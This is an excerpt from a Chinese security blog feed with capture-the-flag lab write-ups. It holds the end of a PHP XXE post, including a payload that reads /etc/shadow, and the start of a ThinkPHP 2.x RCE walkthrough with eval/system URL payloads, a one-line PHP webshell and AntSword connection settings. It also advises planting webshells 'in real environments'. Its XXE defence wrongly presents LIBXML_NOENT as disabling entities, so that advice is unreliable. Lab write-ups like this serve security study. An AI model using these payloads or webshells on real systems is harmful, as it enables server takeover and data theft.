class=&#34;hljs-string&#34;&gt;&amp;quot;file:///etc/shadow&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;&amp;amp;aaa;&lt;/span&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;关键点&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置 &lt;code&gt;Content-Type: application/xml&lt;/code&gt; 以确保服务器按 XML 解析。&lt;/li&gt;
&lt;li&gt;调整 &lt;code&gt;Content-Length&lt;/code&gt; 为实际载荷长度。&lt;/li&gt;
&lt;li&gt;点击 “Send”，发送请求。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4-验证攻击结果&#34;&gt;&lt;a href=&#34;#4-验证攻击结果&#34; class=&#34;headerlink&#34; title=&#34;4. 验证攻击结果&#34;&gt;&lt;/a&gt;4. 验证攻击结果&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;若靶场未正确过滤外部实体，响应中会回显 &lt;code&gt;/etc/shadow&lt;/code&gt; 文件内容，形如：&lt;/p&gt;
&lt;figure class=&#34;highlight dns&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs dns&#34;&gt;root:$&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;$...[hash]...:&lt;span class=&#34;hljs-number&#34;&gt;18356:0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;99999:7&lt;/span&gt;:::&lt;br&gt;daemon:*:&lt;span class=&#34;hljs-number&#34;&gt;18356:0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;99999:7&lt;/span&gt;:::&lt;br&gt;...&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;若使用 Payload 2，确认 Python HTTP 服务日志中有 &lt;code&gt;test.dtd&lt;/code&gt; 的请求记录，且响应仍包含 &lt;code&gt;/etc/shadow&lt;/code&gt; 内容。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;验证成功标志&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;响应中包含敏感文件内容。&lt;/li&gt;
&lt;li&gt;无回显（盲 XXE）情况下，可通过外部 DTD 请求或错误信息推断漏洞存在。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;五、XXE-漏洞深入分析&#34;&gt;&lt;a href=&#34;#五、XXE-漏洞深入分析&#34; class=&#34;headerlink&#34; title=&#34;五、XXE 漏洞深入分析&#34;&gt;&lt;/a&gt;五、XXE 漏洞深入分析&lt;/h2&gt;&lt;h3 id=&#34;触发流程&#34;&gt;&lt;a href=&#34;#触发流程&#34; class=&#34;headerlink&#34; title=&#34;触发流程&#34;&gt;&lt;/a&gt;触发流程&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;不安全的 XML 解析&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;PHP 应用使用 &lt;code&gt;DOMDocument&lt;/code&gt; 或 &lt;code&gt;SimpleXMLElement&lt;/code&gt; 处理 XML 输入。&lt;/li&gt;
&lt;li&gt;默认配置未禁用外部实体（&lt;code&gt;libxml_disable_entity_loader(false)&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;恶意实体注入&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;攻击者提交包含 &lt;code&gt;&amp;lt;!ENTITY&amp;gt;&lt;/code&gt; 的 XML 载荷。&lt;/li&gt;
&lt;li&gt;实体引用本地文件、远程 URL 或参数实体。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;信息泄露或攻击&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;解析器加载实体内容，可能导致：&lt;ul&gt;
&lt;li&gt;本地文件内容泄露。&lt;/li&gt;
&lt;li&gt;SSRF（访问内网资源，如 &lt;code&gt;http://localhost:8080&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;DoS（如加载 &lt;code&gt;/dev/random&lt;/code&gt; 或构造 Billion Laughs 攻击）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;PHP-环境中的常见问题&#34;&gt;&lt;a href=&#34;#PHP-环境中的常见问题&#34; class=&#34;headerlink&#34; title=&#34;PHP 环境中的常见问题&#34;&gt;&lt;/a&gt;PHP 环境中的常见问题&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;默认配置&lt;/strong&gt;：PHP 的 &lt;code&gt;libxml2&lt;/code&gt; 默认允许外部实体加载。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;代码示例&lt;/strong&gt;（易受攻击的 PHP 代码）：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$xml&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;php://input&amp;#x27;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$dom&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;DOMDocument&lt;/span&gt;();&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$dom&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;loadXML&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$xml&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$dom&lt;/span&gt;-&amp;gt;textContent;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;上述代码直接解析用户输入的 XML，未禁用外部实体，易受 XXE 攻击。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;六、防护建议&#34;&gt;&lt;a href=&#34;#六、防护建议&#34; class=&#34;headerlink&#34; title=&#34;六、防护建议&#34;&gt;&lt;/a&gt;六、防护建议&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;禁用外部实体解析&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;在 PHP 中使用 &lt;code&gt;libxml_disable_entity_loader(true)&lt;/code&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;libxml_disable_entity_loader&lt;/span&gt;(&lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$dom&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;DOMDocument&lt;/span&gt;();&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$dom&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;loadXML&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$xml&lt;/span&gt;, LIBXML_NOENT | LIBXML_DTDLOAD);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;或设置 &lt;code&gt;LIBXML_NOENT&lt;/code&gt; 标志禁用实体替换。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;使用安全的解析方式&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;避免直接解析用户提交的 XML。&lt;/li&gt;
&lt;li&gt;使用 JSON 或其他格式替代 XML。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;白名单验证输入&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;验证 XML 结构，仅允许预期的标签和属性。&lt;/li&gt;
&lt;li&gt;使用 XML Schema 或 DTD 限制输入。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;网络隔离&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;限制服务器出站连接，防止 SSRF 访问内网资源。&lt;/li&gt;
&lt;li&gt;使用防火墙阻止非必要外部请求。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;升级依赖&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;确保 PHP 和 &lt;code&gt;libxml2&lt;/code&gt; 库为最新版本，修复已知漏洞。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;错误信息屏蔽&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;禁用详细错误回显，避免泄露文件路径或系统信息。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;七、总结&#34;&gt;&lt;a href=&#34;#七、总结&#34; class=&#34;headerlink&#34; title=&#34;七、总结&#34;&gt;&lt;/a&gt;七、总结&lt;/h2&gt;&lt;p&gt;PHP XXE 漏洞利用展示了 XML 解析器在处理外部实体时的安全风险。通过构造恶意 XML 载荷，攻击者可轻松读取服务器敏感文件或发起 SSRF 攻击。开发者和安全从业者应重视 XML 解析的配置安全，采取禁用外部实体、输入验证等措施，降低漏洞风险。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;: 本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。&lt;/p&gt;
&lt;/blockquote&gt;
</content>
        <category term="Web安全" />
        <category term="XXE" />
        <category term="漏洞复现" />
        <category term="PHP" />
        <category term="SSRF" />
        <updated>2025-07-29T06:39:23.000Z</updated>
    </entry>
    <entry>
        <id>https://bae-ace.github.io/2025/07/28/ThinkPHP-2-x-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-BUUCTF%EF%BC%89/</id>
        <title>ThinkPHP 2.x &amp; 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）</title>
        <link rel="alternate" href="https://bae-ace.github.io/2025/07/28/ThinkPHP-2-x-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-BUUCTF%EF%BC%89/"/>
        <content type="html">&lt;h1 id=&#34;ThinkPHP-2-x-5-x-远程代码执行漏洞复现与利用（基于-BUUCTF）&#34;&gt;&lt;a href=&#34;#ThinkPHP-2-x-5-x-远程代码执行漏洞复现与利用（基于-BUUCTF）&#34; class=&#34;headerlink&#34; title=&#34;ThinkPHP 2.x &amp;amp; 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）&#34;&gt;&lt;/a&gt;ThinkPHP 2.x &amp;amp; 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）&lt;/h1&gt;&lt;h2 id=&#34;一、前言&#34;&gt;&lt;a href=&#34;#一、前言&#34; class=&#34;headerlink&#34; title=&#34;一、前言&#34;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;ThinkPHP 是一个广受欢迎的 PHP 开发框架，但其早期版本（2.x 和 5.0.x 至 5.0.23）因设计缺陷存在严重的&lt;strong&gt;远程代码执行（RCE）漏洞&lt;/strong&gt;。这些漏洞允许攻击者通过精心构造的 URL 参数执行任意 PHP 代码或系统命令，甚至实现服务器完全控制。本文基于 &lt;strong&gt;BUUCTF&lt;/strong&gt; 在线靶场，详细复现 ThinkPHP 2.x 和 5.x 的 RCE 漏洞，涵盖漏洞原理、利用过程、蚁剑连接以及后门植入的可能性，旨在帮助安全从业者和开发者深入理解和防范此类漏洞。&lt;/p&gt;
&lt;p&gt;本文将分为两部分：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 2.x RCE 漏洞&lt;/strong&gt;：利用模板变量解析缺陷执行代码和命令。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 5.x RCE 漏洞&lt;/strong&gt;：通过框架路由调用任意函数实现代码执行。&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;二、ThinkPHP-2-x-RCE-漏洞复现&#34;&gt;&lt;a href=&#34;#二、ThinkPHP-2-x-RCE-漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;二、ThinkPHP 2.x RCE 漏洞复现&#34;&gt;&lt;/a&gt;二、ThinkPHP 2.x RCE 漏洞复现&lt;/h2&gt;&lt;h3 id=&#34;1-靶场环境&#34;&gt;&lt;a href=&#34;#1-靶场环境&#34; class=&#34;headerlink&#34; title=&#34;1. 靶场环境&#34;&gt;&lt;/a&gt;1. 靶场环境&lt;/h3&gt;&lt;p&gt;BUUCTF 提供在线靶场，无需自行搭建环境。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 2.x RCE 漏洞地址&lt;/strong&gt;：&lt;code&gt;https://buuoj.cn/challenges#[ThinkPHP]2-Rce&lt;/code&gt;&lt;br&gt;开启靶场，访问页面后，通常显示简陋的 ThinkPHP 2.x 欢迎页面，但后台隐藏着强大的远程命令执行能力 。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-漏洞原理&#34;&gt;&lt;a href=&#34;#2-漏洞原理&#34; class=&#34;headerlink&#34; title=&#34;2. 漏洞原理&#34;&gt;&lt;/a&gt;2. 漏洞原理&lt;/h3&gt;&lt;p&gt;ThinkPHP 2.x 的模板引擎在处理 URL 参数时，直接将参数拼接为模板变量，未进行严格过滤。例如，URL 参数 &lt;code&gt;name=$&amp;#123;@phpinfo()&amp;#125;&lt;/code&gt; 会被解析为：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; $&amp;#123;@&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;phpinfo&lt;/span&gt;()&amp;#125; &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;由于 &lt;code&gt;@phpinfo()&lt;/code&gt; 是合法的 PHP 函数调用，服务器会执行 &lt;code&gt;phpinfo()&lt;/code&gt; 函数并返回结果。如果结合 &lt;code&gt;eval()&lt;/code&gt; 或 &lt;code&gt;assert()&lt;/code&gt;，攻击者可通过 GET 或 POST 参数进一步执行任意代码或系统命令，形成完全控制。&lt;/p&gt;
&lt;h3 id=&#34;3-漏洞利用过程&#34;&gt;&lt;a href=&#34;#3-漏洞利用过程&#34; class=&#34;headerlink&#34; title=&#34;3. 漏洞利用过程&#34;&gt;&lt;/a&gt;3. 漏洞利用过程&lt;/h3&gt;&lt;h4 id=&#34;步骤-1：测试代码执行（POC1）&#34;&gt;&lt;a href=&#34;#步骤-1：测试代码执行（POC1）&#34; class=&#34;headerlink&#34; title=&#34;步骤 1：测试代码执行（POC1）&#34;&gt;&lt;/a&gt;步骤 1：测试代码执行（POC1）&lt;/h4&gt;&lt;p&gt;使用以下 Payload 测试是否可以执行 PHP 代码：&lt;/p&gt;
&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ruby&#34;&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;http:&lt;/span&gt;/&lt;span class=&#34;hljs-regexp&#34;&gt;/node3.buuoj.cn:26104/&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;?s&lt;/span&gt;=&lt;span class=&#34;hljs-regexp&#34;&gt;/index/index&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/name/&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$&amp;#123;&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;@phpinfo&lt;/span&gt;()&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回 &lt;code&gt;phpinfo()&lt;/code&gt; 的详细信息，证明代码被成功解析执行 。&lt;/p&gt;
&lt;h4 id=&#34;步骤-2：执行系统命令（POC2）&#34;&gt;&lt;a href=&#34;#步骤-2：执行系统命令（POC2）&#34; class=&#34;headerlink&#34; title=&#34;步骤 2：执行系统命令（POC2）&#34;&gt;&lt;/a&gt;步骤 2：执行系统命令（POC2）&lt;/h4&gt;&lt;p&gt;利用 &lt;code&gt;eval()&lt;/code&gt; 结合 GET 参数执行系统命令（如 &lt;code&gt;ls&lt;/code&gt;）：&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node3.buuoj.cn:26104/?s=/index/index/name=$&amp;#123;@eval($_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;1&lt;/span&gt;])&amp;#125;&amp;amp;1=system(%27ls%27);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;参数说明&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;name=$&amp;#123;@eval($_GET[1])&amp;#125;&lt;/code&gt;：通过 &lt;code&gt;eval()&lt;/code&gt; 执行 GET 参数 &lt;code&gt;1&lt;/code&gt; 的内容。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1=system(%27ls%27)&lt;/code&gt;：执行 &lt;code&gt;system(&amp;#39;ls&amp;#39;)&lt;/code&gt;，其中 &lt;code&gt;%27&lt;/code&gt; 是 URL 编码的单引号 &lt;code&gt;&amp;#39;&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回目录列表，例如：&lt;figure class=&#34;highlight axapta&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs axapta&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;index&lt;/span&gt;.php&lt;br&gt;flag&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
说明 &lt;code&gt;ls&lt;/code&gt; 命令执行成功。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;步骤-3：读取-Flag-文件&#34;&gt;&lt;a href=&#34;#步骤-3：读取-Flag-文件&#34; class=&#34;headerlink&#34; title=&#34;步骤 3：读取 Flag 文件&#34;&gt;&lt;/a&gt;步骤 3：读取 Flag 文件&lt;/h4&gt;&lt;p&gt;尝试读取 &lt;code&gt;/flag&lt;/code&gt; 文件内容：&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node3.buuoj.cn:26104/?s=/index/index/name=$&amp;#123;@eval($_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;1&lt;/span&gt;])&amp;#125;&amp;amp;1=system(%27cat%20flag%27);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回类似以下内容：&lt;/p&gt;
&lt;figure class=&#34;highlight dust&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs dust&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;hljs-template-variable&#34;&gt;&amp;#123;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这表明目标服务器已被完全控制 。&lt;/p&gt;
&lt;h3 id=&#34;4-使用蚁剑连接&#34;&gt;&lt;a href=&#34;#4-使用蚁剑连接&#34; class=&#34;headerlink&#34; title=&#34;4. 使用蚁剑连接&#34;&gt;&lt;/a&gt;4. 使用蚁剑连接&lt;/h3&gt;&lt;p&gt;为了更方便地操作服务器，可以上传一句话木马并使用蚁剑（AntSword）进行交互。&lt;/p&gt;
&lt;h4 id=&#34;构造-Payload：&#34;&gt;&lt;a href=&#34;#构造-Payload：&#34; class=&#34;headerlink&#34; title=&#34;构造 Payload：&#34;&gt;&lt;/a&gt;构造 Payload：&lt;/h4&gt;&lt;p&gt;使用 POST 参数构造一句话木马：&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node3.buuoj.cn:26104/?s=/index/index/name=$&amp;#123;@eval($_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;1&lt;/span&gt;])&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;蚁剑配置&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;URL&lt;/strong&gt;：&lt;code&gt;http://node3.buuoj.cn:26104/?s=/index/index/name=$&amp;#123;@eval($_POST[1])&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;密码&lt;/strong&gt;：&lt;code&gt;1&lt;/code&gt;（对应 &lt;code&gt;$_POST[1]&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：PHP（原生）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;编码&lt;/strong&gt;：默认&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;连接成功后，可使用蚁剑进行：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;命令行执行&lt;/li&gt;
&lt;li&gt;文件管理（如上传、下载）&lt;/li&gt;
&lt;li&gt;终端交互&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;5-进一步操作&#34;&gt;&lt;a href=&#34;#5-进一步操作&#34; class=&#34;headerlink&#34; title=&#34;5. 进一步操作&#34;&gt;&lt;/a&gt;5. 进一步操作&lt;/h3&gt;&lt;p&gt;在真实环境中，可进行以下高级操作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;上传 WebShell&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;在蚁剑中上传一句话木马（如 &lt;code&gt;&amp;lt;?php @eval($_POST[&amp;#39;pass&amp;#39;]);?&amp;gt;&lt;/code&gt;）或冰蝎（Behinder）木马。&lt;/li&gt;
&lt;li&gt;保存到可访问路径（如 &lt;code&gt;/var/www/html/shell.php&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;反弹 Shell&lt;/strong&gt;：&lt;ul&gt;
